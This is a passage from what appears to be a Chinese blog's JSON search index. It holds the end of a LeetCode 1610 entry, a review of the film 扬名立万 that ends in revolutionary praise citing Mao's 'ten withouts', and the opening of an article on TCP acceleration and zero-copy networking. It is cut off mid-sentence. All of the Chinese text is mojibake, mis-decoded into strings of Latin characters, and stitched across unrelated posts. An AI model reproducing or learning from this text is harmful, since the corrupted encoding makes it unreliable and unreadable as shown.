Overã€‚\n","date":"2021-12-16T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1610.-%E5%8F%AF%E8%A7%81%E7%82%B9%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E7%9B%AE/","title":"é”™é¢˜æœ¬ | LeetCode1610. å¯è§ç‚¹çš„æœ€å¤§æ•°ç›®"},{"content":"ã€Šæ‰¬åç«‹ä¸‡ã€‹æ˜¯ä¸€éƒ¨å¥½ç”µå½±ã€‚\nå•ä»¥å…¶æƒ…èŠ‚ä¹‹å¦™ï¼Œæœ¬ä¸è¶³ä»¥ä¸“å†™ä¸€ç¯‡æ¥ä½œæ„Ÿæ‚Ÿï¼Œè€Œä»æ•…äº‹æœ¬èº«æ‰€èƒ½çœ‹åˆ°çš„ã€è”æƒ³çš„ä¸œè¥¿ï¼Œä¾¿ä¸æ‰æ­¤æ–‡ã€‚\næ‰¬åç«‹ä¸‡æ˜¯äººç‰©è¡ŒåŠ¨çš„ç›®çš„ã€‚\næƒ…èŠ‚çš„æè¦ æ•…äº‹ä»¥ç”µå½±è®¨è®ºä¼šä¸ºåˆ‡å…¥ç‚¹ï¼Œç”µå½±èµ„æ–¹é™†çˆ·ã€å¯¼æ¼”éƒ‘ã€æ¼”å‘˜å…³ã€æ¼”å‘˜æ¢¦è¶ã€æ¼”å‘˜è‚–ã€ç¼–å‰§æå®¶è¾‰ï¼Œå¸Œæœ›å°†æ­¤å‰è½°åŠ¨ä¸Šæµ·çš„ä¸‰è€å‡¶æ€æ¡ˆæ‹æˆç”µå½±ï¼Œä¸ºæ­¤è¯·æ¥äº†å‡¶æ‰‹é½ä¹å±±å’Œè­¦å¯Ÿæµ·å…†ä¸°ã€‚æå®¶è¾‰æ— æ„é—´ä¿¯èº«çœ‹åˆ°é½ä¹å±±çš„è„šé•£ï¼Œæ‰çŸ¥æ™“å¯¹æ–¹å°±æ˜¯æ¡ˆä»¶çš„å‡¶æ‰‹ï¼Œå°±æ­¤é’ˆå¯¹æ¡ˆä»¶ç»†èŠ‚å‘å…¶å±•å¼€äº†ä¸€ç³»åˆ—çŠ€åˆ©çš„é—®è¯¢ã€‚é½ä¹å±±çš„å›ç­”é€»è¾‘æ— æ³•è‡ªæ´½ï¼Œè€Œæ­¤æ—¶çš„æ¼”å‘˜å…³çœ‹å‡ºäº†é½ä¹å±±éåŒä¸€èˆ¬çš„èº«ä»½ã€‚æ•…äº‹çš„ç¬¬ä¸€éƒ¨åˆ†ç»“æŸã€‚\næå®¶è¾‰å‡ºè¨€ä¸­ä¼¤æ¢¦è¶ï¼Œä¼—äººéšç€æ¢¦è¶æ¥åˆ°å¤§å…ã€‚åœ¨è¿™é‡Œï¼Œèˆè¹ˆã€äº¤è°ˆã€æµ·æŠ¥ç­‰ä¼ç¬”çº·çº·ç™»åœºï¼Œéšç€æå®¶è¾‰å’Œæ¢¦è¶æš‚æ—¶å’Œå¥½ï¼Œæ•…äº‹çš„ç¬¬äºŒéƒ¨åˆ†ç»“æŸã€‚\næ•…äº‹çš„ç¬¬ä¸‰éƒ¨åˆ†ç”±æ¼”å‘˜è‚–å¿—æ‹‰å¼€ã€‚æœ¬æ¬²å–é…’çš„è‚–å¿—æ— æ„é—´é—¯å…¥ä¸‰è€é‡å®³çš„ç°åœºï¼Œä¼—äººéšåèµ¶åˆ°ï¼Œç„¶åç”±é™†çˆ·æ­ä¸‹äº†ä¸€ä¼—äººçš„çœŸå®é¢ç›®ï¼šè¿‡æ°”çš„æ¼”å‘˜å…³ã€è¢«åˆ«äººå¨èƒçš„æ¢¦è¶ã€ä¸å¾—å¿—çš„è‚–å¿—ã€å¾—ç½ªäº†è®¸å¤šå¤§ä½¬çš„æå®¶è¾‰ï¼Œå¬é›†ä¸€å¹²äººæ‹ç”µå½±çš„ç›®çš„å°±æ˜¯ä¸ºäº†â€æ‰¬åç«‹ä¸‡â€œã€‚æ­¤æ—¶ï¼Œä¼—äººå¸Œæœ›å°†ä¸‰è€é‡å®³è¿™ä¸€å¤§æ¡ˆä»¶å‘ˆç°å‡ºæ¥ï¼Œå› æ­¤æ›´åŠ çƒ­åˆ‡åœ°å¸Œæœ›å¯»æ‰¾æ¡ˆä»¶çš„çœŸç›¸ã€‚\nä¼—äººåœ¨æ¡ˆå‘ç°åœºå‘ç°äº†è¢«è£å¼€çš„ç”»ã€å¤©èŠ±æ¿ä¸Šçš„é€šé£å£ã€å¤©èŠ±æ¿ä¸Šçš„é’©å­ï¼Œç»è¿‡ä¸æ–­çš„æ¨ç†ï¼Œæ¡ˆä»¶çš„çœŸç›¸ä¼¼ä¹å‘¼ä¹‹æ¬²å‡ºäº†ã€‚\né½ä¹å±±æ‰“å¼€äº†è‡ªå·±çš„æ‰‹é“å’Œè„šé•£ï¼Œæ¥åˆ°äº†å‘½æ¡ˆç°åœºï¼ŒåŒæ—¶ï¼Œæå®¶è¾‰å’Œè‚–å¿—ä»é€šé£ç®¡é“ä¸­å¾—åˆ°çš„ä¸€äº›çº¿ç´¢ï¼Œä½¿å¾—æ•´ä¸ªæ¡ˆä»¶æ„ˆå‘æ‰‘æœ”è¿·ç¦»ã€‚åœ¨ä¸é½ä¹å±±çš„å¯¹å³™ä¸­ï¼Œæå®¶è¾‰å‘å…¶è¯´æ˜äº†è‡ªå·±çš„æ¨ç†ï¼Œä»è€Œä½¿å¾—é½ä¹å±±å¼€å¯äº†å›å¿†ï¼Œäº‹ä»¶çš„ç­”æ¡ˆä¼¼ä¹å·²ç»å‘ˆç°å‡ºæ¥äº†ï¼šé½ä¹å±±æ‰€çˆ±çš„ã€ä¸”å—åˆ°å…„å¼Ÿä¹‹æ‰˜æ‰€ç…§é¡¾çš„å¥³å­å¤œèºï¼Œåœ¨ä¸Šæµ·æ»©é—¯å‡ºä¸€ç‰‡äº‹ä¸šä¹‹åï¼Œå—åˆ°ä¸‰è€çš„çŒ¥äºµï¼Œè€Œé½ä¹å±±æ„¤æ€’æ— æ¯”ï¼Œæ€ä¸‰è€ã€æ¯å¤œèºçš„å°¸ä½“ã€å›åˆ°ç°åœºç­‰å€™è­¦å¯Ÿåˆ°æ¥ã€‚é½ä¹å±±çš„ä¾›è¿°ä¼¼ä¹å¤©è¡£æ— ç¼ï¼Œä¸‰è€çš„æ¡ˆä»¶ä¸æ³•å›½åŒ»ç”Ÿç¢å°¸çš„æ¡ˆä»¶è”ç³»èµ·æ¥äº†ï¼Œä¼—äººä¼¼ä¹éƒ½è®¤å¯äº†è¿™ä¸€æƒ…èŠ‚ï¼Œè®¨è®ºå¦‚ä½•å°†è¿™ä¸ªæ•…äº‹ç”¨ç”µå½±å‘ˆç°å‡ºæ¥ã€‚\nè¿›å…¥æ•…äº‹çš„ç¬¬äº”éƒ¨åˆ†ï¼Œâ€è¸©ç­ç«è‹—çš„äººâ€œå¸¦ç€ä¸€å¸®äººè¿›å…¥äº†ç°åœºï¼Œæ§åˆ¶äº†ä¼—äººã€‚åœ¨ç»æœ›ä¹‹é™…ï¼Œè‚–å¿—ã€é½ä¹å±±ä¸æ¥è€…çˆ†å‘äº†å†²çªï¼Œæœ€åé½ä¹å±±èˆå‘½å°†ä¸€åˆ‡ç­”æ¡ˆæ©åŸ‹åœ¨äº†ç«æµ·ä¹‹ä¸­ã€‚\næ•…äº‹çš„æœ€åï¼Œä¼—äººæ‹çš„ç”µå½±åœ¨è¶Šå—ä¸Šæ˜ ï¼Œä¸‰è€çš„åŠ£è¿¹å…¬ä¹‹äºä¼—ï¼Œäº‹ä»¶ä¼¼ä¹è¿æ¥äº†æ¬¢å–œçš„ç»“å±€ã€‚ç„¶è€Œï¼Œåœ¨è¯•æ˜ ä¼šä¸Šï¼Œå¤œèºçš„å‡ºç°ä½¿å¾—æ•…äº‹çš„çœŸç›¸å†ä¸€æ¬¡åè½¬ï¼šå¤œèºæ²¡æœ‰æ­»ï¼Œé½ä¹å±±æ²¡æœ‰æ¯å°¸ï¼Œé½ä¹å±±çš„ç½ªå­½ï¼Œæˆ–è€…è¯´æ˜¯å®Œå…¨çš„è´¡çŒ®ï¼Œåªæ˜¯é™¤æ‰äº†ä¸ºå®³ä¸€æ–¹çš„ä¸‰è€è€Œå·²ã€‚çœŸç›¸åªæœ‰æå®¶è¾‰çŸ¥é“ï¼Œä½†ä¸ºç€å¤œèºï¼Œææ€•ä»–ä¸ä¼šå®£æ‰¬äº†ã€‚\næ•£åœºï¼Œç¯äº®ï¼Œæˆ‘é™·å…¥æ€è€ƒä¸­è€Œå¹¶æœªç«‹å³èµ·èº«ç¦»å»ã€‚æ•…äº‹æ˜¯å–œå‰§è¿˜æ˜¯æ‚²å‰§å‘¢ï¼Ÿææ€•æ˜¯å–œå‰§çš„æ ‡å‡†ï¼Œæ‚²å‰§çš„å†…æ ¸ã€‚é½ä¹å±±çš„æ­»ï¼Œåº”è¯¥ç§°ä¸ºå°±ä¹‰çš„ï¼Œæ©åŸ‹äº†å¤œèºæ‰€é­é‡çš„ä¸€åˆ‡ï¼›æå®¶è¾‰æ‰€è¿½æ±‚çš„çœŸç›¸ï¼Œä¸€ç›´åˆ°æ‹æˆäº†ç”µå½±ï¼Œä¹Ÿå¹¶ä¸æ˜¯å®Œå…¨çš„çœŸç›¸ï¼›å¤œèºçš„é­é‡æ˜¯å…¨ç‰‡æœ€å¤§çš„æ‚²å‰§ï¼Œæˆ‘åé¢å†è®²ã€‚\nä¼ç¬”çš„åˆ†æ å½±ç‰‡çš„ç¬¬ä¸€ä¸ªå‡ºå½©ä¹‹å¤„ï¼Œæ˜¯ä½¿ç”¨äº†å¾ˆå¤šçš„ä¼ç¬”ï¼Œä¸”è¿™äº›ä¼ç¬”éƒ½è¿›è¡Œäº†å·§å¦™çš„å›æ”¶ã€‚\né½ä¹å±±çš„åˆ€ï¼Œæ˜¯ä»–å»è¿‡å°åº¦çš„è¯æ®ï¼Œåˆ€ä¸Šçš„å¼¹å­”ï¼Œæ˜¯æ¡ˆå‘è¢«æ•æ—¶æµ·å…†ä¸°èµ°ç«ç•™ä¸‹çš„ã€‚\næµ·å…†ä¸°åœ¨ç°åœºè§¦å‘äº†ä¸€æ¬¡é—ªå…‰ç¯ï¼Œå…¶å®æ˜¯å·å·åœ°æ‹ä¸‹äº†è‡ªå·±å’Œå¶åƒï¼ˆæ¢¦è¶ï¼‰çš„åˆå½±ï¼Œè€Œä»–ä¸´æ­»ä¹‹é™…ï¼Œå°†èƒ¶å·äº¤ç»™äº†æ¢¦è¶ï¼Œæœ€ååœ¨æŠ¥çº¸ä¸ŠåˆŠå‘äº†å‡ºæ¥ã€‚\nè¢«è£å¼€çš„ç”»å¯ä»¥ä½œä¸ºæ”¯æ’‘ç‰©ç™»ä¸Šé€šé£å£ï¼Œè¿™ä¸€æ‰‹æ³•åœ¨æŸ¯å—ä¸­æ˜¯æåˆ°è¿‡çš„ã€‚\nåœ¨çœ‹å¤œèºçš„æµ·æŠ¥æ—¶ï¼Œæ¢¦è¶æ›¾è¯´å¥¹æˆ´çš„æ˜¯å‡å‘ï¼Œè¿™ä¸ªå‡å‘åœ¨é€šé£ç®¡é“ä¸­è¢«æ‰¾å‡ºæ¥äº†ï¼Œä¸ºä»€ä¹ˆåœ¨é€šé£ç®¡é“ä¸­ï¼Ÿåœ¨ç¬¬ä¸€ç‰ˆâ€çœŸç›¸â€œä¸­ï¼Œå¤œèºè¢«è‚¢è§£ï¼Œé½ä¹å±±å°†å‡å‘ä¸¢å¼ƒåœ¨ç®¡é“ä¸­ï¼›åœ¨ç¬¬äºŒç‰ˆçœŸç›¸ä¸­ï¼Œå¤œèºæ²¡æœ‰æ­»ï¼Œå‡å‘åº”è¯¥æ˜¯å¥¹åœ¨é€šé£ç®¡é“ä¸­çˆ¬è¡Œæ—¶æ‰è½äº†ã€‚\né½ä¹å±±è®²åˆ°äº†å¤œèºä¸ºå›½ç‹é©±é™¤æ­»ç¥çš„æ•…äº‹ï¼Œè€Œå¤œèºè¿™ä¸ªäººç¡®å®é©±é™¤äº†æ­»ç¥ï¼Œå¥¹æ²¡æœ‰æ­»ã€‚\næµ·å…†ä¸°åœ¨ä¼—äººæ…Œä¹±æ—¶ç«Ÿç„¶å¤±æ‰‹æŠŠæªæ‰è½äº†ï¼Œè¿™æ ·è¿˜å«ä»€ä¹ˆç¥æªæ‰‹å‘¢ï¼Ÿåœ¨æœ€åæˆ‘ä»¬çŸ¥é“ï¼Œä»–æ˜¯ä¸ªæ–‡èŒã€‚\né½ä¹å±±ä¸ºä»€ä¹ˆä»”ç»†çœ‹æŠ¥ï¼Œèˆå…çš„é€‰ç¥¨æ˜¯ä»€ä¹ˆï¼Œæå®¶è¾‰åœ¨ç®¡é“ä¸­å¬åˆ°çš„å†²æ°´å£°æ˜¯ä»€ä¹ˆï¼Œè¿™äº›ç»†èŠ‚éƒ½å›æ”¶äº†ã€‚\nè¿˜æœ‰å…¶ä»–çš„ä¸€äº›ä¼ç¬”ï¼Œæ€»ä¹‹æ˜¯ç²¾å·§çš„ã€‚\næˆ‘çš„æ„Ÿæƒ³ æˆ‘æœ€å¤§çš„æ„Ÿæƒ³ï¼Œä¸æ˜¯æƒ…èŠ‚å¦‚ä½•çš„å·§å¦™ï¼Œä¸æ˜¯æ•…äº‹æœ¬èº«å¦‚ä½•çš„åè½¬ä¹‹åè½¬ï¼Œè€Œæ˜¯ä¸‰è€ä¸å¤œèºï¼Œæ˜¯é‚£ä¸ªæ—¶ä»£çš„æœ€å¤§çš„æ‚²å‰§ã€‚\nåœ¨é‚£æ ·åƒäººçš„æ—¶ä»£ä¹‹ä¸­ï¼Œä¸€ä¸ªé è‡ªå·±çš„ç¾è²Œä¸èƒ½åŠ›å¥‹æ–—è€Œæˆä¸ºåäººçš„å¤œèºï¼Œç®—å¾—ä¸Šä»€ä¹ˆå‘¢ï¼Ÿä¸‰è€æ˜¯ä»€ä¹ˆï¼Ÿä¸‰è€æ˜¯åœ°ä¸»é˜¶çº§ã€ä¹°åŠå¤§èµ„æœ¬é˜¶çº§çš„ä»£è¡¨ï¼Œä»–ä»¬æŠŠæŒäº†ä¸­å›½å¤§éƒ¨åˆ†çš„èµ„æºè€Œæ— æ¶ä¸ä½œï¼Œçœ‹ä¼¼é£å…‰çš„å¤œèºï¼Œåœ¨è¿™ä¸ªé˜¶çº§é¢å‰æ²¡æœ‰ä»»ä½•å°Šä¸¥å¯è¨€ï¼Œé‘è®ºå…¶ä»–çš„åŠ³è‹¦ä¼—ç”Ÿã€‚ä¸€ä¸ªå¤œèºçš„å°Šä¸¥ï¼Œè¢«é½ä¹å±±ä»¥æ­»æå«äº†ï¼Œå…¶æ‚²ç—›çš„æ•…äº‹è¢«åŸ‹è‘¬åœ¨ç«æµ·ä¹‹ä¸­äº†ï¼Œè€Œåƒåƒä¸‡ä¸‡ä¸ªå¤œèºçš„å°Šä¸¥ï¼Œæ²¡äººæå«ï¼Œå¥¹ä»¬çš„ç—›è‹¦ï¼Œæ²¡äººç†ç¬ï¼Œæœ‰çš„åªæ˜¯æ»šæ»šè€Œå»çš„æ—¶å…‰å’Œå†ä¹…å¼¥æ–°çš„åˆ›ä¼¤è€Œå·²ã€‚é‚£å¹´çš„æ”¿åºœæ˜¯ä¸ªä»€ä¹ˆæ”¿åºœå‘¢ï¼Ÿä»å—äº¬æ¥çš„â€è¸©ç­ç«è‹—çš„äººâ€œï¼Œæ˜¾ç„¶ä¸ä»£è¡¨æ­£ä¹‰ã€‚\næˆ‘æƒ³ï¼Œæ•…äº‹æœ€æ‚²ç—›çš„åœ°æ–¹å³æ˜¯é‚£ä¸ªå¹´ä»£æœ€æ‚²ç—›çš„åœ°æ–¹ã€‚ä¸‰è€è¿™æ ·çš„äººã€å¤œèºè¿™æ ·çš„äº‹å‘ç”Ÿåœ¨ä¸­å›½çš„å¤§åœ°ä¸Šï¼Œé½ä¹å±±ç²¾å¿ƒè¥é€ çš„è¿™æ ·çš„åè½¬ä¹‹åè½¬ï¼Œæ— æ¯”æƒ¨çƒˆã€‚æ•…äº‹æœ€ä¼Ÿå¤§çš„åœ°æ–¹ï¼Œå°±æ˜¯è®©æˆ‘æ„Ÿåˆ°é©å‘½ä¹‹ä¼Ÿå¤§ï¼Œåªè¦è¿™æ ·çš„æ•…äº‹å°‘äº†ï¼Œè¿™æ ·ç²¾å·§è€Œæ— å¥ˆçš„åè½¬ä¹‹åè½¬ä¸è¦äº†ï¼Œé‚£æœ«ä¸­å›½çš„å¤§åœ°å°±å¹²å‡€äº†ï¼Œå°±å‘ç€æ¯›ä¸»å¸­è¯´çš„â€åä¸ªæ²¡æœ‰â€œå‰è¿›äº†ã€‚\nçœ‹å®Œäº†è¿™éƒ¨ä½œå“ï¼Œåœ¨è¢«ä¸‰è€çš„æ¶å’Œå¤œèºé½ä¹å±±çš„æ‚²å‹å¾—é€ä¸è¿‡æ°”æ¥ä¹‹åï¼Œæˆ‘æ— æ¯”åœ°æ†§æ†¬æ¯›ä¸»å¸­è¯´çš„é‚£ä¸ªâ€ä¸€æ²¡æœ‰è´ªå®˜æ±¡åï¼ŒäºŒæ²¡æœ‰åœŸè±ªåŠ£ç»…ï¼Œä¸‰æ²¡æœ‰èµŒåšï¼Œå››æ²¡æœ‰å¨¼å¦“ï¼Œäº”æ²¡æœ‰å°è€å©†ï¼Œå…­æ²¡æœ‰å«èŠ±å­ï¼Œä¸ƒæ²¡æœ‰ç»“å…šè¥ç§ä¹‹å¾’ï¼Œå…«æ²¡æœ‰èé¡ä¸æŒ¯ä¹‹æ°”ï¼Œä¹æ²¡æœ‰äººåƒæ‘©æ“¦é¥­ï¼Œåæ²¡æœ‰äººå‘å›½éš¾è´¢â€œçš„ä¸–ç•Œã€‚\næˆ‘çš„å…¶æ¬¡çš„æ„Ÿæƒ³ï¼Œæ˜¯å¸Œæœ›é¡ºç€ç¼–å‰§å’Œå¯¼æ¼”çš„æ€æƒ³ï¼ŒæŠŠæ‰¬åç«‹ä¸‡è¿™ä¸ªé¢˜ç›®ä½“ä¼šæ¸…æ¥šã€‚æˆ‘æƒ³ï¼Œæ‰¬åç«‹ä¸‡æ˜¯æ•…äº‹å¼€å§‹çš„åŠ¨æœºï¼Œæ˜¯æ•…äº‹æ¨è¿›çš„åŠ¨åŠ›ï¼Œæ˜¯æ•…äº‹ç»“å±€çš„æ¦‚æ‹¬ã€‚è¿™äº›æ¼”å‘˜åœ¨æœ€åæ‰¬åç«‹ä¸‡äº†å—ï¼Ÿæˆ‘å¸Œæœ›æ˜¯çš„ï¼Œä»–ä»¬æ‰€æ­ç¤ºçš„é‚£ä¸ªå¹´ä»£çš„ä¸‰è€çš„ç½ªè¡Œï¼Œä½œä¸ºä¸€ä¸ªå…¸å‹å°†æ°¸è¿œåœ°æµä¼ ä¸‹å»ï¼Œå°†ä½œä¸ºäººæ°‘é©å‘½çš„è­¦ç¤ºç‰Œï¼ŒçŸ—ç«‹åœ¨é‚£ä¸ªè™šæ‹Ÿçš„æ–‡è‰ºç•Œä¸Šã€‚\næˆ‘æœ€å¤§çš„å¸Œæœ›ï¼Œå°±æ˜¯å¸Œæœ›ä¸­å›½å¤§åœ°ä¸Šä¸è¦å†å‡ºç°ä»»ä½•ä¸€ä¸ªä¸‰è€ï¼Œä¸è¦å†å‡ºç°ä»»ä½•ä¸€ä¸ªçš„â€è¸©ç­ç«è‹—çš„äººâ€œã€‚è®©æ— äº§é˜¶çº§åœ¨å¤œèºçš„æ­Œå”±ä¸­ï¼ŒåŸ‹è‘¬æ‰€æœ‰çš„ä¸‰è€å§ï¼æ­»äº¡ä¸å±äºæ— äº§é˜¶çº§ï¼\n","date":"2021-11-26T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%A7%82%E6%89%AC%E5%90%8D%E7%AB%8B%E4%B8%87/","title":"è§‚ã€Šæ‰¬åç«‹ä¸‡ã€‹"},{"content":"ä¼ è¾“æ§åˆ¶åè®®ï¼ˆTCPï¼‰æ˜¯æˆ‘ä»¬çš„è€æœ‹å‹äº†ï¼Œå®ƒåŠ›æ±‚åœ¨ä¸å¯é çš„IPç½‘ç»œä¸Šå®ç°å¯é çš„æ•°æ®ä¼ è¾“ï¼Œä¹Ÿå°±æ˜¯ä½¿å¾—æ•°æ®åŒ…æœ‰åºã€æ— ä¸¢å¤±å’Œä¸é‡å¤ï¼Œå› æ­¤ï¼Œå¼•å…¥äº†å¦‚æ ¡éªŒã€åºå·ã€ç¡®è®¤ã€é‡ä¼ ç­‰æœºåˆ¶ã€‚åŒæ—¶ï¼Œè¿™ä½è€æœ‹å‹ä¹Ÿæ˜¯æ¯”è¾ƒè´Ÿè´£ä»»çš„ï¼Œåœ¨ç½‘ç»œæ‹¥æŒ¤æ—¶ï¼Œä¸ºäº†ä¸ä½¿æƒ…å†µé›ªä¸ŠåŠ éœœï¼Œå®ƒå¼•å…¥äº†æ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ç­‰æœºåˆ¶ã€‚\nç°åœ¨çš„ç½‘ç»œä¸–ç•Œä¸­ï¼Œæˆ‘ä»¬æ—¥å¸¸è¿›è¡Œçš„ç½‘é¡µæµè§ˆã€æ¸¸æˆã€è§†é¢‘ç­‰æ´»åŠ¨éƒ½ç¦»ä¸å¼€TCPã€‚éšç€ç½‘ç»œçš„å‘å±•ï¼Œç½‘ç»œä¸Šé¢æ‰¿è½½çš„æ•°æ®åŒ…è¶Šæ¥è¶Šå¤šï¼Œåœ¨ä¸ºå¤šæ•°äººæ‰€å…±äº«çš„å¹¿åŸŸç½‘ä¸Šï¼Œåœ¨äººä»¬ä¸Šç½‘çš„é«˜å³°æœŸï¼Œç½‘ç»œä¼šå­˜åœ¨ä¸€å®šçš„æ‹¥å¡ï¼Œåæ˜ åˆ°æˆ‘ä»¬çš„ä¸Šç½‘ä½“éªŒä¸Šï¼Œå°±æ˜¯å»¶è¿Ÿå’Œä¸¢åŒ…ã€‚åŠ è½½ä¸ªç½‘é¡µè¦èŠ±æ‰åå‡ ç§’ã€ç©ä¸ªç‹è€…è£è€€æ—¶ä¸æ—¶å»¶è¿Ÿ200+ã€çœ‹è§†é¢‘å¡é¡¿ç­‰ï¼Œé™¤äº†è®¾å¤‡çš„é—®é¢˜ï¼Œææ€•ç½‘ç»œæ‹¥å¡éš¾è¾å…¶å’ã€‚åœ¨è¿™æ ·çš„èƒŒæ™¯ä¹‹ä¸‹ï¼ŒTCPåŠ é€ŸæŠ€æœ¯ä¹Ÿå°±äº§ç”Ÿå’Œå‘å±•äº†ã€‚\nå®é™…ä¸Šï¼ŒTCPåŠ é€Ÿä¹Ÿä¸æ˜¯ä¸€ä¸ªæ–°çš„æ¦‚å¿µäº†ï¼Œåå‡ å¹´å‰å°±æœ‰ç›¸å…³çš„ç ”ç©¶ï¼Œä½†æ˜¯è¿™ä¸€ç†å¿µåœ¨ç°ä»Šçš„èƒŒæ™¯ä¸‹æ˜¾å¾—è¾ƒæœ‰æ„ä¹‰ï¼Œæˆ‘ä»¬å¯¹å…¶è¿›è¡Œä¸€äº›å­¦ä¹ å’Œå®è·µï¼Œå¤§æ¦‚ä¸ç®—æ˜¯æµªè´¹æ—¶é—´çš„ã€‚\nä¸¤ç§æ–¹æ¡ˆ TCPåŠ é€Ÿå¯ä»¥ä»å‡ ä¸ªè§’åº¦æ¥è¿›è¡Œåˆ†ç±»ï¼Œè¾ƒä¸ºå¸¸è§ä¸”æ˜“æ‡‚çš„æ˜¯ä»åŠ é€Ÿæ–¹æ¡ˆçš„éƒ¨ç½²ä½ç½®æ¥åˆ†ã€‚å¦‚æœåªåœ¨å®¢æˆ·/æœåŠ¡å™¨çš„æŸä¸€è¾¹æ¥éƒ¨ç½²TCPåŠ é€Ÿï¼Œå°±å«åš å•è¾¹åŠ é€Ÿ ï¼Œå¦‚æœåŒæ–¹éƒ½è¦éƒ¨ç½²ï¼Œå°±å«åš åŒè¾¹åŠ é€Ÿ ã€‚ä¸¤ç§æ–¹æ¡ˆä¸€èˆ¬æœ‰ä¸åŒçš„ä½¿ç”¨åœºæ™¯ï¼Œå•è¾¹åŠ é€Ÿå¸¸éƒ¨ç½²åœ¨æœåŠ¡ç«¯ä¸Šï¼Œè¿™æ ·å°±èƒ½é€æ˜åœ°æå‡ç”¨æˆ·çš„è®¿é—®ä½“éªŒï¼›åŒè¾¹åŠ é€Ÿå¸¸å¸¸æ˜¯åŒæ–¹åå•†å¥½çš„ä¸€å¥—åŠ é€Ÿæ–¹æ¡ˆï¼Œå› æ­¤ä¸èƒ½åšåˆ°é€æ˜ï¼Œå¯ä»¥ç”¨åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½å¯æ§çš„åœºæ™¯ä¸­ï¼Œæ¯”å¦‚åœ¨ä¸ªäººäº‘æœåŠ¡å™¨ä¸Šè¿è¡Œç€æŸé¡¹æœåŠ¡ï¼Œæ­¤æ—¶å¯ä»¥åœ¨è‡ªå·±çš„å®¢æˆ·ç«¯PCå’ŒæœåŠ¡ç«¯éƒ½éƒ¨ç½²TCPåŠ é€Ÿï¼Œæ¥æ”¹å–„è®¿é—®ä½“éªŒã€‚\nå•è¾¹åŠ é€Ÿæ¦‚è¿° å•è¾¹åŠ é€Ÿæ–¹æ¡ˆåªéœ€è¦ç”±å®¢æˆ·æˆ–æœåŠ¡ç«¯çš„ä¸€æ–¹æ¥éƒ¨ç½²ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸”å¯¹å¯¹æ–¹æ˜¯é€æ˜çš„ã€‚æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“TCPæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼šåœ¨ åè®®è§„å®š çš„è¿è¡Œæ¨¡å¼ä¸‹ï¼Œå‘é€æ–¹çš„ç³»ç»Ÿ äº§ç”Ÿå’Œå¤„ç†æ•°æ® ã€ æŠŠæ•°æ®äº¤ç»™ç½‘å¡ ã€ç½‘å¡å‘é€æ•°æ®ï¼Œæ¥æ”¶æ–¹æ¥æ”¶æ•°æ®ã€æŠŠæ•°æ®äº¤ç»™ç³»ç»Ÿã€å¤„ç†æ•°æ®ã€‚ä»è¿™ä¸€å¥—æµç¨‹ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥å‘ç°å‡ ä¸ªå¯ä»¥ä¸‹æ‰‹çš„åœ°æ–¹ï¼Œæ¯ä¸ªåœ°æ–¹éƒ½å°è¯•ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯¹TCPåŠ é€Ÿçš„è®¤è¯†ä¹Ÿå°±å·®ä¸å¤šäº†ã€‚\næ•°æ®åŒ…å¤„ç†ä¼˜åŒ– è¯´æ˜¯æ•°æ®åŒ…å¤„ç†ä¼˜åŒ–ï¼Œå…¶å®å°±æ˜¯æ‰€è°“çš„â€œç½‘ç»œæ€§èƒ½ä¼˜åŒ–â€ã€‚è¿™ä¸ªæ¦‚å¿µè·ŸTCPåè®®æœ¬èº«æ²¡æœ‰å¤ªå¤šå…³ç³»ï¼Œä¸»è¦æ˜¯é’ˆå¯¹æ”¶å‘æ•°æ®åŒæ–¹çš„ç¡¬ä»¶ã€æ“ä½œç³»ç»Ÿç­‰è¿›è¡Œä¼˜åŒ–ã€‚\nå‡å°‘å¤åˆ¶ æŒ‰ç…§ä¸Šé¢è¯´è¿‡çš„æµç¨‹ï¼Œå‘é€æ–¹çš„ç³»ç»Ÿè¦äº§ç”Ÿå’Œå¤„ç†æ•°æ®ï¼Œç„¶åæŠŠæ•°æ®äº¤ç»™ç½‘å¡ã€‚è¿™ä¸€æ­¥æ˜¯ä¸€ä¸ªå¤åˆ¶çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯å°†æ•°æ®ä»ç³»ç»Ÿæˆ–è€…åº”ç”¨ç¨‹åºæ‰€åœ¨çš„å†…å­˜ç©ºé—´å¤åˆ¶äº†ä¸€ä»½åˆ°ç½‘å¡çš„å†…å­˜ç©ºé—´ã€‚è¿™ä¸€æ­¥æ˜¯å¯ä»¥ä¼˜åŒ–çš„ï¼Œæœ‰ä¸‹é¢è¿™å‡ ç§åŠæ³•ã€‚\nç›´æ¥è®¿é—®ç½‘å¡å­˜å‚¨ç©ºé—´ ã€‚è¿™ç§æ–¹æ¡ˆå–æ¶ˆäº†å¤åˆ¶ï¼Œè€Œé‡‡ç”¨åœ°å€æ˜ å°„æˆ–ç›´æ¥è®¿é—®çš„åŠæ³•ï¼Œç›¸å½“äºå°†ç½‘å¡çœ‹ä½œäº†æ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚ä¸ºäº†å®ç°è¿™ç§æ–¹æ¡ˆï¼Œç½‘å¡è¦å…·å¤‡ä¸€å®šçš„æ™ºèƒ½æ€§ï¼Œå¦åˆ™æ— æ³•æ”¯æŒå¤šåº”ç”¨çš„è®¿é—®ï¼Œä¹Ÿæ— æ³•åœ¨åˆé€‚çš„æ—¶æœºä¼ é€’æ•°æ®ã€‚\nä¸ç½‘å¡å…±äº«å­˜å‚¨åŒºåŸŸ ã€‚è®©ç½‘å¡ç”¨DMAæˆ–å…¶ä»–ä»€ä¹ˆæ–¹å¼æ¥è®¿é—®å†…æ ¸å†…å­˜ç©ºé—´ï¼Œæ¯”ä¸Šé¢çš„æ–¹æ¡ˆç®€å•ä¸€äº›ï¼Œå¯¹ç½‘å¡çš„è¦æ±‚å°‘ä¸€äº›ã€‚\nå…¶ä»–å„ç§å†…å­˜æ˜ å°„æ–¹æ¡ˆ ã€‚å†…å­˜æ˜ å°„å¯ä»¥å®ç°åº”ç”¨ã€ç½‘å¡å’Œå†…æ ¸ä¸‰è€…çš„å†…å­˜å…±äº«ï¼Œæ— 